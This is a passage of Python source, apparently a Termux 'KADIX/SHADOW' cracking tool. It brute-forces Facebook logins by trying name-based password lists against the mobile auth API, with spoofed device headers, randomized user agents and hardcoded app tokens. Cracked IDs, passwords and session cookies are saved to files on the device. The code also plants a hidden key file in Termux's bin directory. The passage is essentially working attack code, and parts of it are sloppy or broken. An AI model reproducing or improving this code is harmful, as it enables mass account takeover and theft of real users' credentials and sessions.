'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        headers = {'Host': 'graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-connection-bandwidth': '29920503', 
'x-fb-net-hni': '34528', 
'x-fb-sim-hni': '38333', 
'Zero-Rated': '0', 
'x-fb-connection-quality': 'EXCELLENT', 
'x-fb-connection-type': 'MOBILE.LTE', 
'user-agent': UA(), 
'content-type': 'app_authlication/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger',
'x-fb-client-IP': 'True',
'x-fb-server-cluster': 'Keep-Alive',
'Content-Type': 'application/json'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [𝐒𝐇𝐀𝐃𝐎𝐖-𝐎𝐊] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f"\r\r{B}[{G}COOKIE{B}]>{A} "+coki)
                                        open('/sdcard/KADIX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break   
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐒𝐇𝐀𝐃𝐎𝐖-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                     
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [KADIX-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api4(ids,names,passlist):
                try:
                        global ok,loop,sim_id
                        sys.stdout.write('\r\r\033[38;5;48m [\033[38;5;208mKADIX-𝐌4\033[38;5;48m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/94.0.0.2688;FBBV/8462836;[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604787;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/0;FBCR/Namaste;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200G;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBCR/Vodafone;FBMF/motorola;FBBD/motorola;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m [KADIX-𝐎𝐊] '+ids+' | '+pas+'\033[1;97m')                 
                                        #print("\033[1;33m [BISCUT-] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/KADIX-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SHADOW/SHADOW-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [KADIX-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [KADIX-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/94.0.0.2688;FBBV/8462836;[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604787;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/0;FBCR/Vi India;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200G;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBPN/{str(fbs)};FBLC/en_US;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/{random.choice(mamu)};FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]"+"[FBCR/banglalink;FBMF/asus;FBBD/asus;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/7.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'your account was locked' in po:
                                pass
                        elif 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        
                                        print('\r\r\033[1;32m [KADIX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/KADIX/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/K/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[1;31m [KADIX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHADOW/KADIX-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)        
        except Exception as e:
                pass

W = '\x1b[1;37m'
G = '\x1b[1;32m'
R = '\x1b[1;91m'
S = '\x1b[1;36m'
B = '\x1b[1;34m'
Y = '\x1b[1;33m'
P = '\x1b[1;35m'
cnt=0
cp=0
ok=0
ok1=0
loop=0
died=0
live=0
import os,sys,time,re,uuid,base64,zlib,subprocess
from concurrent.futures import  ThreadPoolExecutor as tpe
try:
    import httpx
    from io import BytesIO
except:
    os.system('pip install httpx')
    import httpx
    from io import BytesIO
try:import httpx
except:os.system('pkg uninstall python;pkg install python -y;pip install httpx')
try:import httpx
except:print('\n httpx Module Error!\n Contact With Owner! ');exit()
import random
def random_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; U; Android 4.1.2; ar-il; GT-I9100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; W6500 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=(f"KADIX✓veux~CREATE:{uid}TS{key1}110E==")
key2 = base64.b64encode(str(f"{kex}").encode('utf-8'))
key=(f"{key2}")
fkeyx = key.replace("b'","").replace("'","")

def cvt(st,ran):
    try:
        if st == 'ok': cookie = ('c_user=%s;xs=%s;fr=%s;datr=%s;'%(ran['c_user'],ran['xs'],ran['fr'],ran['datr']))
        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s;'%(ran['checkpoint'],ran['datr'],ran['fr']))
    except Exception as e : cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
    return(str(cookie))
    
def a(k):return k
import os,time,_md5,marshal,inspect 
if str(os.system)==str(print):
  exit()
  sys.exit()
  os._exit(0)
def random_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9500 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; U; Android 4.2.2; pt-pt; ALCATEL ONE TOUCH 5036D Build/JDQ39) AppleWebKit/534.30'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
